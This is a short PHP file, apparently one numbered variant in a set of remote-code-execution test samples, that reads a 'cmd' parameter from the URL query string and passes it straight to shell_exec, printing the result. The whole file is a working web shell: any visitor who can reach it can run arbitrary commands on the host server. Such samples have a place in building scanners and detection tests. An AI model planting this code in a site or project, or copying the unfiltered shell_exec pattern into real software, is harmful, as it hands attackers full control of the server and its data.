<?php
// RCE test variation #1153
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>